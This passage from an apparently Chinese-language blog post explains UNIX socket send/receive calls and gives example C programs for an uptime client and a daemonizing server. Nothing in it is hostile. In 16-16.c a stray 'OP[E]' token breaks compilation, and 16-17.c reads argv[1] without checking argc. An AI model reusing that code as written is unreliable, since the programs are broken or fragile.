class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes, <span class="hljs-type">int</span> flags)</span>;<br><span class="hljs-comment">//返回值：若成功，返回发送的字节数，若出错，返回-1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230225192531323.png" alt="image-20230225192531323"></p><h2 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h2><p>与<code>send</code>函数的唯一区别是该函数可以携带地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sendto</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes, <span class="hljs-type">int</span> flags, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *destaddr, <span class="hljs-type">socklen_t</span> destlen)</span>;<br><span class="hljs-comment">//返回值：若成功，返回发送的字节数；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h2 id="sendmsg"><a href="#sendmsg" class="headerlink" title="sendmsg"></a>sendmsg</h2><p>与上两个发送函数的区别，信息以<code>msghdr</code>结构体携带</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sendmsg</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> msghdr *msg, <span class="hljs-type">int</span> flags)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回发送的字节数；若出错，返回-1</span><br></code></pre></td></tr></table></figure><p><strong>msghdr</strong>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> &#123;</span><br><span class="hljs-type">void</span> *msg_name; <span class="hljs-comment">/* optional address */</span><br><span class="hljs-type">socklen_t</span> msg_namelen; <span class="hljs-comment">/* address size in bytes */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> *<span class="hljs-title">msg_iov</span>;</span> <span class="hljs-comment">/* array of I/O buffers */</span><br><span class="hljs-type">int</span> msg_iovlen; <span class="hljs-comment">/* number of elements in array */</span><br><span class="hljs-type">void</span> *msg_control; <span class="hljs-comment">/* ancillary data */</span><br><span class="hljs-type">socklen_t</span> msg_controllen; <span class="hljs-comment">/* number of ancillary bytes */</span><br><span class="hljs-type">int</span> msg_flags; <span class="hljs-comment">/* flags for received message */</span><br>...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recv</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes, <span class="hljs-type">int</span> flags)</span>;<br><span class="hljs-comment">//返回值：返回数据的字节长度；若无可用数据或对等方已经按序结束，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230225194325201.png" alt="image-20230225194325201"></p><h2 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h2><p><code>recvfrom</code>函数与<code>recv</code>函数的区别在于可以接收发送信息方的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recvfrom</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">void</span> *<span class="hljs-keyword">restrict</span> buf,<span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> flags, <span class="hljs-keyword">struct</span> sockaddr *<span class="hljs-keyword">restrict</span> addr, <span class="hljs-type">socklen_t</span> *<span class="hljs-keyword">restrict</span> addrlen)</span>;<br><span class="hljs-comment">//返回值：返回数据的字节长度；若无可用数据或对等方已经按序结束，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h2 id="recvmsg"><a href="#recvmsg" class="headerlink" title="recvmsg"></a>recvmsg</h2><p>使用<code>msghdr</code>结构体接收信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recvmsg</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-keyword">struct</span> msghdr *msg, <span class="hljs-type">int</span> flags)</span>;<br><span class="hljs-comment">//返回值：返回数据的字节长度；若无可用数据或对等方已经按序结束，返回0：若出错，返回-1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230225200104067.png" alt="image-20230225200104067"></p><p><strong>16-16.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFLEN 128  </span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">connect_retry</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *, <span class="hljs-type">socklen_t</span>)</span>;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">print_uptime</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">char</span> buf[BUFLEN];<br><br>    <span class="hljs-keyword">while</span> ((n = recv(sockfd, buf, BUFLEN, <span class="hljs-number">0</span>)) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;writing\n&quot;</span>);<br>        write(STDOUT_FILENO, buf, n);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;recv error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">ailist</span>, *<span class="hljs-title">aip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hint</span>;</span><br>    <span class="hljs-type">int</span> sockfd, err;<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)OP[E]<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: ruptime hostname&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;hint, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(hint));<br>    hint.ai_socktype = SOCK_STREAM; <span class="hljs-comment">//TCP连接</span><br>    hint.ai_canonname = <span class="hljs-literal">NULL</span>;<br>    hint.ai_addr = <span class="hljs-literal">NULL</span>;<br>    hint.ai_next = <span class="hljs-literal">NULL</span>;   <br>    <span class="hljs-keyword">if</span> ((err = getaddrinfo(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;ruptime&quot;</span>, &amp;hint, &amp;ailist)) != <span class="hljs-number">0</span>) <span class="hljs-comment">//获取服务器名与服务对应的地址和端口</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;getaddrinfo error: %s&quot;</span>, gai_strerror(err));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (aip = ailist; aip != <span class="hljs-literal">NULL</span>; aip = aip-&gt;ai_next)&#123;<br>        <span class="hljs-keyword">if</span> ((sockfd = connect_retry(aip-&gt;ai_family, SOCK_STREAM, <span class="hljs-number">0</span>, aip-&gt;ai_addr, aip-&gt;ai_addrlen)) &lt; <span class="hljs-number">0</span>)&#123;<br>            err = errno;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            print_uptime(sockfd);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t connect to %s&quot;</span>,argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>16-17.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFLEN 1024</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">connect_retry</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *, <span class="hljs-type">socklen_t</span>)</span>;<br><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">print_uptime</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">char</span> buf[BUFLEN];<br><br>    <span class="hljs-keyword">while</span> ((n = recv(sockfd, buf, BUFLEN, <span class="hljs-number">0</span>)) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;writing\n&quot;</span>);<br>        write(STDOUT_FILENO, buf, n);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;recv error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">ailist</span>, *<span class="hljs-title">aip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hint</span>;</span><br>    <span class="hljs-type">int</span> sockfd, err;<br><br>    <span class="hljs-built_in">memset</span>(&amp;hint, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(hint));<br>    hint.ai_socktype = SOCK_STREAM;<br>    hint.ai_canonname = <span class="hljs-literal">NULL</span>;<br>    hint.ai_addr = <span class="hljs-literal">NULL</span>;<br>    hint.ai_next = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> ((err = getaddrinfo(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;ruptimed&quot;</span>, &amp;hint, &amp;ailist)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;getaddrinfo error: %s&quot;</span>, gai_strerror(err));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (aip = ailist; aip != <span class="hljs-literal">NULL</span>; aip = aip-&gt;ai_next)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ai_canonname:%s&quot;</span>,aip-&gt;ai_canonname);<br>        <span class="hljs-keyword">if</span>((sockfd = connect_retry(aip-&gt;ai_family, SOCK_STREAM, <span class="hljs-number">0</span>, aip-&gt;ai_addr, aip-&gt;ai_addrlen)) &lt; <span class="hljs-number">0</span>)&#123;<br>            err = errno;<br>        &#125;<span class="hljs-keyword">else</span><br>        &#123;<br>            print_uptime(sockfd);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t connect to %s&quot;</span>,argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>16-18.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syslog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QLEN 10</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> HOST_NAME_MAX</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HOST_NAME_MAX 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">initserver</span><span class="hljs-params">(<span class="hljs-type">int</span> type, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> alen, <span class="hljs-type">int</span> qlen)</span>;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">set_cloexec</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br><br>    <span class="hljs-keyword">if</span> ((val = fcntl(fd, F_GETFD, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    val |= FD_CLOEXEC; <span class="hljs-comment">//使用exec执行时，关闭该文件描述符</span><br><br>    <span class="hljs-keyword">return</span>(fcntl(fd, F_SETFD,val));<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">daemonize</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd)</span><br>&#123;<br><span class="hljs-type">int</span>i, fd0, fd1, fd2;<br><span class="hljs-type">pid_t</span>pid;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span><span class="hljs-title">rl</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span><span class="hljs-title">sa</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear file creation mask.</span><br><span class="hljs-comment"> */</span><br>umask(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get maximum number of file descriptors.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;rl) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t get file limit&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Become a session leader to lose controlling TTY.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t fork&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) <span class="hljs-comment">/* parent */</span><br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>setsid();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ensure future opens won&#x27;t allocate controlling TTYs.</span><br><span class="hljs-comment"> */</span><br>sa.sa_handler = SIG_IGN;<br>sigemptyset(&amp;sa.sa_mask);<br>sa.sa_flags = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (sigaction(SIGHUP, &amp;sa, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t ignore SIGHUP&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t fork&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) <span class="hljs-comment">/* parent */</span><br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Change the current working directory to the root so</span><br><span class="hljs-comment"> * we won&#x27;t prevent file systems from being unmounted.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (chdir(<span class="hljs-string">&quot;/&quot;</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t change directory to /&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Close all open file descriptors.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (rl.rlim_max == RLIM_INFINITY)<br>rl.rlim_max = <span class="hljs-number">1024</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rl.rlim_max; 